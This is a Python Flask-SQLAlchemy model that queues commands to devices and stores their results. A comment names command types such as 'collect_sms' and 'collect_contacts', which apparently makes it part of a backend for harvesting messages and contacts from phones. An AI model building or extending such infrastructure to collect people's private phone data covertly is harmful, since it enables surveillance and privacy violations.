from app import db
from datetime import datetime
import json

class Command(db.Model):
    """Command model for storing commands sent to devices"""
    __tablename__ = 'commands'
    
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.Integer, db.ForeignKey('devices.id'), nullable=False, index=True)
    command_type = db.Column(db.String(100), nullable=False)  # collect_sms, collect_contacts, etc.
    command_data = db.Column(db.Text)  # JSON string for command parameters
    priority = db.Column(db.String(20), default='normal')  # low, normal, high, critical
    status = db.Column(db.String(20), default='pending')  # pending, executing, completed, failed, cancelled
    created_at = db.Column(db.DateTime, default=datetime.utcnow, index=True)
    executed_at = db.Column(db.DateTime)
    completed_at = db.Column(db.DateTime)
    
    # Results
    result_data = db.Column(db.Text)  # JSON string for command results
    result_size = db.Column(db.Integer)  # Size of result data in bytes
    error_message = db.Column(db.Text)
    execution_time = db.Column(db.Float)  # Execution time in seconds
    
    # Metadata
    sent_by = db.Column(db.Integer, db.ForeignKey('users.id'))
    retry_count = db.Column(db.Integer, default=0)
    max_retries = db.Column(db.Integer, default=3)
    
    # Relationships
    # Device side defines `Device.commands` with backref='device'; avoid duplicate here
    user = db.relationship('User', backref='sent_commands')
    
    def __repr__(self):
        return f'<Command {self.command_type} for device {self.device_id}>'
    
    def to_dict(self):
        """Convert command to dictionary"""
        return {
            'id': self.id,
            'device_id': self.device_id,
            'command_type': self.command_type,
            'command_data': json.loads(self.command_data) if self.command_data else None,
            'priority': self.priority,
            'status': self.status,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'executed_at': self.executed_at.isoformat() if self.executed_at else None,
            'completed_at': self.completed_at.isoformat() if self.completed_at else None,
            'result_size': self.result_size,
            'error_message': self.error_message,
            'execution_time': self.execution_time,
            'retry_count': self.retry_count,
            'max_retries': self.max_retries
        }
    
    def mark_executing(self):
        """Mark command as executing"""
        self.status = 'executing'
        self.executed_at = datetime.utcnow()
    
    def mark_completed(self, result_data=None, result_size=0):
        """Mark command as completed"""
        self.status = 'completed'
        self.completed_at = datetime.utcnow()
        if result_data:
            self.result_data = json.dumps(result_data)
        self.result_size = result_size
        
        # Calculate execution time
        if self.executed_at:
            self.execution_time = (self.completed_at - self.executed_at).total_seconds()
    
    def mark_failed(self, error_message=None):
        """Mark command as failed"""
        self.status = 'failed'
        self.completed_at = datetime.utcnow()
        if error_message:
            self.error_message = error_message
        
        # Calculate execution time
        if self.executed_at:
            self.execution_time = (self.completed_at - self.executed_at).total_seconds()
    
    def mark_cancelled(self):
        """Mark command as cancelled"""
        self.status = 'cancelled'
        self.completed_at = datetime.utcnow()
    
    def increment_retry(self):
        """Increment retry count"""
        self.retry_count += 1
        if self.retry_count >= self.max_retries:
            self.mark_failed('Max retries exceeded')
    
    def can_retry(self):
        """Check if command can be retried"""
        return self.status in ['failed', 'pending'] and self.retry_count < self.max_retries
    
    @classmethod
    def get_pending_commands(cls, device_id=None):
        """Get pending commands"""
        query = cls.query.filter_by(status='pending')
        if device_id:
            query = query.filter_by(device_id=device_id)
        return query.order_by(cls.priority.desc(), cls.created_at.asc()).all()
    
    @classmethod
    def get_device_commands(cls, device_id, status=None, limit=50):
        """Get commands for a specific device"""
        query = cls.query.filter_by(device_id=device_id)
        if status:
            query = query.filter_by(status=status)
        return query.order_by(cls.created_at.desc()).limit(limit).all()
    
    @classmethod
    def get_command_stats(cls):
        """Get command statistics"""
        total = cls.query.count()
        pending = cls.query.filter_by(status='pending').count()
        executing = cls.query.filter_by(status='executing').count()
        completed = cls.query.filter_by(status='completed').count()
        failed = cls.query.filter_by(status='failed').count()
        cancelled = cls.query.filter_by(status='cancelled').count()
        
        # Get command type distribution
        type_stats = db.session.query(
            cls.command_type,
            db.func.count(cls.id).label('count')
        ).group_by(cls.command_type).all()
        
        # Get average execution time
        avg_execution_time = db.session.query(
            db.func.avg(cls.execution_time)
        ).filter(cls.execution_time.isnot(None)).scalar()
        
        return {
            'total_commands': total,
            'pending_commands': pending,
            'executing_commands': executing,
            'completed_commands': completed,
            'failed_commands': failed,
            'cancelled_commands': cancelled,
            'success_rate': (completed / total * 100) if total > 0 else 0,
            'type_distribution': {stat.command_type: stat.count for stat in type_stats},
            'average_execution_time': float(avg_execution_time) if avg_execution_time else 0
        }
    
    @classmethod
    def cleanup_old_commands(cls, days=30):
        """Clean up old completed commands"""
        from datetime import timedelta
        cutoff_date = datetime.utcnow() - timedelta(days=days)
        
        old_commands = cls.query.filter(
            cls.status.in_(['completed', 'failed', 'cancelled']),
            cls.completed_at < cutoff_date
        ).all()
        
        for command in old_commands:
            db.session.delete(command)
        
        db.session.commit()
        return len(old_commands) 